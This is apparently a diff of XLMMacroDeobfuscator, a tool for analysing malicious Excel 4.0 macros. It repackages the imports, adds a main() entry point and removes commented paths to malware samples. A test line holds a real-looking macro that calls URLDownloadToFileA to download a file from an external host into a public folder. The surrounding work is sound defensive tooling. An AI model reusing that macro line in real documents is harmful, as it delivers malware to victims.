@@ -1,15 +1,17 @@
 import argparse
+import os
+import sys
 from lark import Lark
 from lark.exceptions import ParseError
 from lark.lexer import Token
-from excel_wrapper import XlApplicationInternational
-from xlsm_wrapper import XLSMWrapper
-from xls_wrapper import XLSWrapper
-from xlsb_wrapper import XLSBWrapper
+from XLMMacroDeobfuscator.excel_wrapper import XlApplicationInternational
+from XLMMacroDeobfuscator.xlsm_wrapper import XLSMWrapper
+from XLMMacroDeobfuscator.xls_wrapper import XLSWrapper
+from XLMMacroDeobfuscator.xlsb_wrapper import XLSBWrapper
 from enum import Enum
 import time
 import datetime
-from boundsheet import *
+from XLMMacroDeobfuscator.boundsheet import *
 import os
 import operator
 
@@ -461,18 +463,12 @@ def test_parser():
         """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))
 
 
-if __name__ == '__main__':
+_thismodule_dir = os.path.normpath(os.path.abspath(os.path.dirname(__file__)))
+_parent_dir = os.path.normpath(os.path.join(_thismodule_dir, '..'))
+if _parent_dir not in sys.path:
+    sys.path.insert(0, _parent_dir)
 
-    # path = r"C:\Users\user\Downloads\xlsmtest.xlsm"
-    # tmp\01558388b33abe05f25afb6e96b0c899221fe75b037c088fa60fe8bbf668f606.xlsm
-    # tmp\63bacd873beeca6692142df432520614a1641ea395adaabc705152c55ab8c1d7.xlsm
-    # tmp\b5cd024106fa2e571b8050915bcf85a95882ee54173a7a8020bfe69d1dea39c7.xlsm
-    # tmp\4dcee9176ca1241b6a25182f778db235a23a65b86161d0319318c4923c3dc6e6.xlsm
-
-    # xl
-    # tmp\xls\1ed44778fbb022f6ab1bb8bd30849c9e4591dc16f9c0ac9d99cbf2fa3195b326.xls
-    # tmp\xls\edd554502033d78ac18e4bd917d023da2fd64843c823c1be8bc273f48a5f3f5f.xls
-
+def main():
     def get_file_type(path):
         file_type = None
         with open(path, 'rb') as input_file:
@@ -568,3 +564,8 @@ if __name__ == '__main__':
             print('Error: input file does not exist')
     else:
         arg_parser.print_help()
+
+
+if __name__ == '__main__':
+    main()
+
